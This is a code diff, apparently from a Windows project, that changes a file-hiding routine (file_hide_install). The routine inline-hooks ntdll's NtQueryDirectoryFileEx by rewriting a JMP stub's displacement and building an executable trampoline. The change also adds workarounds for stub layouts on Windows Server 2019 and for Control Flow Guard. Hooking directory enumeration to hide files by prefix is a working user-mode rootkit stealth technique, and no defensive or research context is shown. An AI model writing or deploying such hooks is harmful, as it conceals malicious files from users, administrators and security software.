@@ -206,35 +206,49 @@ int file_hide_install(PrefixTable *table)
     DWORD tmp;
     VirtualProtect((void *)g_original, PATCH_SIZE, oldProt, &tmp);
 
-    /* --- Hook NtQueryDirectoryFileEx (Windows 10 1709+) --- */
+    /* --- Hook NtQueryDirectoryFileEx (Windows 10 1709+) ---
+       On some builds (e.g. Win Server 2019 17763), the export is a
+       5-byte E9 JMP rel32 forwarding stub followed by CC padding and
+       then the next function.  Patching 12+ bytes there corrupts the
+       neighbor; patching the distant retpoline target also crashes
+       (CFG / guard pages).  Instead: rewrite only the E9's 4-byte
+       displacement so it points to our hook, and build the trampoline
+       as an absolute JMP to the original target.  For standard stubs
+       (first byte != E9), use the normal 16-byte trampoline. */
     g_original_ex = (pNtQueryDirectoryFileEx)
         GetProcAddress(ntdll, "NtQueryDirectoryFileEx");
     if (g_original_ex) {
         BYTE *ex_ptr = (BYTE *)g_original_ex;
 
         if (ex_ptr[0] == 0xE9) {
-            /* Forwarding stub → follow E9 JMP, then scan for the
-               actual syscall stub (4C 8B D1 B8 = mov r10,rcx;
-               mov eax,N).  Covers retpoline / CFG trampolines
-               with FF 25 + CC padding before the stub. */
-            INT32 disp = *(INT32 *)(ex_ptr + 1);
-            BYTE *region = ex_ptr + 5 + disp;
-            BYTE *stub = NULL;
-            for (int i = 0; i < 32; i++) {
-                if (region[i]   == 0x4C && region[i+1] == 0x8B &&
-                    region[i+2] == 0xD1 && region[i+3] == 0xB8) {
-                    stub = region + i;
-                    break;
+            INT32 orig_disp = *(INT32 *)(ex_ptr + 1);
+            void *orig_target = ex_ptr + 5 + orig_disp;
+
+            /* Check that our hook is within ±2GB (E9 rel32 range). */
+            INT64 delta = (BYTE *)HookedNtQueryDirectoryFileEx - (ex_ptr + 5);
+            if (delta < -2147483648LL || delta > 2147483647LL) {
+                g_original_ex = NULL;   /* too far — skip */
+            } else {
+                memcpy(g_saved_ex, ex_ptr, PATCH_SIZE);
+
+                g_trampoline_ex = (pNtQueryDirectoryFileEx)
+                    VirtualAlloc(NULL, TRAMP_SIZE,
+                                 MEM_COMMIT | MEM_RESERVE,
+                                 PAGE_EXECUTE_READWRITE);
+                if (g_trampoline_ex) {
+                    write_abs_jmp((BYTE *)g_trampoline_ex, orig_target);
+
+                    if (VirtualProtect(ex_ptr, 5,
+                                       PAGE_EXECUTE_READWRITE, &oldProt)) {
+                        *(INT32 *)(ex_ptr + 1) = (INT32)delta;
+                        VirtualProtect(ex_ptr, 5, oldProt, &tmp);
+                    }
+                } else {
+                    g_original_ex = NULL;
                 }
             }
-            g_original_ex = stub ? (pNtQueryDirectoryFileEx)stub : NULL;
-        }
-
-        /* Skip if the resolved stub IS NtQueryDirectoryFile. */
-        if (g_original_ex && (void *)g_original_ex == (void *)g_original)
-            g_original_ex = NULL;
-
-        if (g_original_ex) {
+        } else {
+            /* Standard syscall stub: normal 16-byte trampoline. */
             memcpy(g_saved_ex, (void *)g_original_ex, PATCH_SIZE);
 
             g_trampoline_ex = (pNtQueryDirectoryFileEx)
